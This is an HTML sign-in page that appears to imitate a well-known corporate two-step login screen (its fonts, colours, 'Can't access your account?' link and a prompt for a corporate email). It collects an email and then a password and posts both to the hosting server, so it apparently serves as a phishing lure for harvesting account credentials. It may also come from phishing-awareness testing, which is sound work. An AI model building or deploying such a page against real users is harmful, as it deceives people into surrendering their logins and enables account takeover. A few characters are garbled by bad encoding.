<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Sign in</title>
  <style>
    body {
      font-family: "Segoe UI", sans-serif;
      background: #0078d4;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }

    .login-box {
      background: #fff;
      width: 360px;
      padding: 2rem;
      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
    }

    h1 {
      font-size: 1.5rem;
      margin-bottom: 1rem;
      color: #1b1b1b;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 0.75rem;
      margin: 0.5rem 0;
      border: 1px solid #ccc;
      border-radius: 2px;
      font-size: 1rem;
    }

    .btn {
      background: #0078d4;
      color: #fff;
      border: none;
      padding: 0.75rem;
      width: 100px;
      margin-top: 0.5rem;
      cursor: pointer;
      border-radius: 2px;
      font-size: 1rem;
    }

    .btn:hover {
      background: #005a9e;
    }

    .link {
      display: block;
      margin: 0.75rem 0;
      font-size: 0.9rem;
      color: #0078d4;
      text-decoration: none;
    }

    .note {
      background: #f3f2f1;
      padding: 0.75rem;
      font-size: 0.9rem;
      margin-top: 1rem;
      border-radius: 2px;
      color: #333;
    }

    .options {
      margin-top: 1rem;
      padding: 0.75rem;
      border-top: 1px solid #ccc;
      font-size: 0.95rem;
      color: #333;
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }

    .options::before {
      content: "ðŸ”‘";
    }

    .hidden {
      display: none;
    }
  </style>
</head>
<body>

  <div class="login-box">
    <h1>Sign in</h1>
    <form id="loginForm" method="POST" action="/">
      <!-- Step 1 -->
      <div id="step1">
        <input type="text" name="username" id="username" placeholder="someone@example.com" required />
        <a href="#" class="link">Canâ€™t access your account?</a>
        <button type="button" class="btn" id="nextBtn">Next</button>
      </div>

      <!-- Step 2 -->
      <div id="step2" class="hidden">
        <p id="displayUser"></p>
        <input type="hidden" name="real_username" id="real_username" />
        <input type="password" name="password" id="password" placeholder="Password" required />
        <button type="submit" class="btn">Sign in</button>
      </div>
    </form>

    <div class="note">
      Please login using your corporate email address<br>
      (example: user@company.com)
    </div>

    <div class="options">
      Sign-in options
    </div>
  </div>

  <script>
    const step1 = document.getElementById('step1');
    const step2 = document.getElementById('step2');
    const usernameInput = document.getElementById('username');
    const realUsernameInput = document.getElementById('real_username');
    const nextBtn = document.getElementById('nextBtn');
    const displayUser = document.getElementById('displayUser');

    nextBtn.addEventListener('click', () => {
      const user = usernameInput.value.trim();
      if (!user) {
        alert('Please enter your email address.');
        return;
      }
      displayUser.textContent = user;
      realUsernameInput.value = user;
      step1.classList.add('hidden');
      step2.classList.remove('hidden');
    });
  </script>

</body>
</html>
